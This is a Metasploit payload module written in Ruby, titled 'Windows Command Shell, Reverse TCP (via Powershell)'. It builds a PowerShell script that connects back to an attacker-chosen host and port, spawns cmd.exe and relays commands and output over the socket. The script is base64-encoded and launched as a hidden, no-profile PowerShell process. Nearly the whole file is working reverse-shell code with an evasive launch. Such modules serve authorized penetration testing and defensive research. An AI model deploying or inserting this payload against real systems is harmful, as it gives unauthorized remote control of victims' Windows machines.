##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/find_shell'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Command Shell, Reverse TCP (via Powershell)',
      'Description'   => 'Connect back and create a command shell via Powershell',
      'Author'        => 'Ben Campbell', #and Anon author of http://pastebin.com/dPPuTDKY
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'powershell',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))

    register_options(
      [
        OptString.new('CMD', [ false, "The command string to execute" ]),
      ], self.class)
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    # Credit to: http://pastebin.com/dPPuTDKY
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    powershell = "function RSC{"\
        "if ($c.Connected -eq $true) {$c.Close()};"\
        "if ($p.ExitCode -ne $null) {$p.Close()};exit;};"\
        "$a='#{lhost}';$p='#{lport}';$c=New-Object system.net.sockets.tcpclient;"\
        "$c.connect($a,$p);$s=$c.GetStream();"\
        "$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"\
        "$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';"\
        "$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;"\
        "$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;"\
        "$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;"\
        "while($os.Peek() -ne -1){"\
          "$o += $e.GetString($os.Read())"\
        "};"\
        "$s.Write($e.GetBytes($o),0,$o.Length);"\
        "$o=$null;$d=$false;$t=0;"\
        "while (-not $d) {"\
          "if ($c.Connected -ne $true) {cleanup};"\
          "$pos=0;$i=1; "\
          "while (($i -gt 0) -and ($pos -lt $nb.Length)) {"\
            "$r=$s.Read($nb,$pos,$nb.Length - $pos);"\
            "$pos+=$r;"\
            "if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}};"\
            "if ($pos -gt 0){"\
              "$str=$e.GetString($nb,0,$pos);"\
              "$is.write($str);start-sleep 1;"\
              "if ($p.ExitCode -ne $null){RSC}else{"\
                "$o=$e.GetString($os.Read());"\
                "while($os.Peek() -ne -1){"\
                  "$o += $e.GetString($os.Read());"\
                  "if ($o -eq $str) {$o=''}"\
                "};"\
                "$s.Write($e.GetBytes($o),0,$o.length);"\
                "$o=$null;"\
                "$str=$null"\
              "}"\
            "}else{RSC}};"\

    powershell_encoded = Rex::Text.encode_base64(Rex::Text.to_unicode(powershell))

    return "powershell.exe -w hidden -nop -e #{powershell_encoded}"
  end

end
